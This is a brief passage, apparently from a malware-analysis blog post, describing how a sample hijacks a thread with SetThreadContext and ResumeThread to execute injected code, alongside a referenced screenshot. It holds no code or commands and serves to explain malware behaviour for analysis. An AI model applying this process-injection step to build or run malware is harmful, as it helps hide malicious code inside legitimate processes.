Once all is sorted out, the malware will get hold of the thread using the SetThreadContext and then resume the thread using the ResumeThread API to execute the code.

![](https://miro.medium.com/v2/resize:fit:945/1*ESLl0B7HhV5NLSy1CDsyrQ.png)

Here, we can see how the program sets the thread context and then resumes it to execute the malicious code.
